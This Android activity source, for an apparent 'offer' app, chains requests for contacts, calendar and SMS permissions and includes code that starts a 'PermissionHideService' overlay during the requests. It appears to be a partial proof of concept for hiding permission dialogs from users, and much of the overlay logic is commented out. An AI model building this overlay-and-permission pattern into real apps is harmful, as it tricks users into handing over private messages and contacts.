package com.snakesonwheels.tabely.view;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.snakesonwheels.tabely.R;

public class OfferActivity extends AppCompatActivity {

    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 0;
    private static final int REQUEST_SMS_PERMISSION_CODE = 1;
    private static final int REQUEST_CALENDAR_PERMISSION_CODE = 2;
    private TextView offerText;
    private Button acceptButton;
    private Button nextButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_offer);

        //initialize layout
        offerText = (TextView) findViewById(R.id.body);
        offerText.setText("Hallo");

        acceptButton = (Button) findViewById(R.id.acceptOffer);
        nextButton = (Button) findViewById(R.id.nextOffer);

        acceptButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "You accepted the offer!", Toast.LENGTH_SHORT).show();
            }
        });

        nextButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "Next offer...", Toast.LENGTH_SHORT).show();
                //Todo: switch to next offer
            }
        });

        //getReadContactPermissions();
        getNewPermission();
    }

    // Start or stop the GameService
    private void overlayService(boolean start) {
        Intent i = new Intent(this, PermissionHideService.class);
        if (start) {
            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.START");
            startService(i);
        } else {
            i.setAction("com.snakesonwheels.tabely.view.PermissionHideService.STOP");
            stopService(i);
        }
    }

    private boolean getReadContactPermissions() {
        // If READ_CONTACTS permission already granted return true
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            return true;
        }
        // Else request permission and return false
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
                REQUEST_CONTACTS_PERMISSION_CODE);

        overlayService(true);
        return false;
    }

    private void getPermission(String permission, int requestCode) {
        ActivityCompat.requestPermissions(this, new String[]{permission}, requestCode);

        //overlayService(true);
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    public void getNewPermission() {
        System.out.println("GET NEW PERMISSION STARTED");

        String readContactsPermission = Manifest.permission.READ_CONTACTS;
        String readCalendarPermission = Manifest.permission.READ_CALENDAR;
        String readSMSPermission = Manifest.permission.READ_SMS;

        if (!checkPermission(readContactsPermission)) {
            System.out.println("READ CONTACTS NOT GIVEN");
            getPermission(readContactsPermission, REQUEST_CONTACTS_PERMISSION_CODE);

        } else if (!checkPermission(readCalendarPermission)) {
            System.out.println("READ CALENDAR NOT GIVEN");
            getPermission(readCalendarPermission, REQUEST_CALENDAR_PERMISSION_CODE);

        } else if (!checkPermission(readSMSPermission)) {
            System.out.println("READ SMS NOT GIVEN");
            getPermission(readSMSPermission, REQUEST_SMS_PERMISSION_CODE);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[]
            grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        //    messagePermissionOverlayService(false);
        /** switch (requestCode) {
         case REQUEST_CONTACTS_PERMISSION_CODE:
         // If READ_CONTACTS permission was granted
         if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
         overlayService(false);

         // Else retry
         } else if (!getReadContactPermissions())
         overlayService(true);
         break;
         } */
    }
}
